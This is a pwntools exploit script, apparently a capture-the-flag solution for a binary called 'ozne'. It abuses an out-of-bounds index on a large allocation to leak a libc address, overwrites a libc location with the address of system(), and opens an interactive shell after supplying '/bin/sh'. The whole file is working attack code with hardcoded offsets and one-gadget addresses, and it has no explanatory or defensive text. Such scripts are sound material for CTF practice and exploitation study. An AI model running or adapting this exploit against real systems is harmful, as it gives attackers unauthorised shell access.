#!/usr/bin/env python3

from pwngun_craft import craft
from pwn import *

# SETTINGS

BINARY = "./ozne"

IP = "IP_ADDR"
PORT = None

LINK_LIBC = True
LIBC = "./libc.so.6"
LD = "./ld-linux-x86-64.so.2"
GDBSCRIPT = """
b *main+94
"""

LOG_LEVEL = "DEBUG"

r, elf, libc = craft(LINK_LIBC, BINARY, LIBC, LD, GDBSCRIPT, IP, PORT, LOG_LEVEL)

one_shots = [0xebcf1, 0xebcf5, 0xebcf8]

# SPLOIT #
r.sendlineafter(b": ", "/bin/sh\x00")
size = 16 * 1024 * 1024 # allocated size is *8 
r.sendlineafter(b": ", str(size).encode())

# leak libc
read_offset = int(size + (0x218FF0/8) + 0x7fe)
r.sendlineafter(b": ", str(read_offset).encode())
libc_base = int(r.recvline().strip().split(b": ")[1].decode()) - libc.symbols['malloc']
print("[+] LIBC: {}".format(hex(libc_base)))

# write
write_offset = int(size + (0x219098/8) + 0x7fe)
r.sendlineafter(b": ", str(write_offset).encode())
r.sendlineafter(b": ", str(libc_base+libc.symbols['system']).encode())

r.interactive()
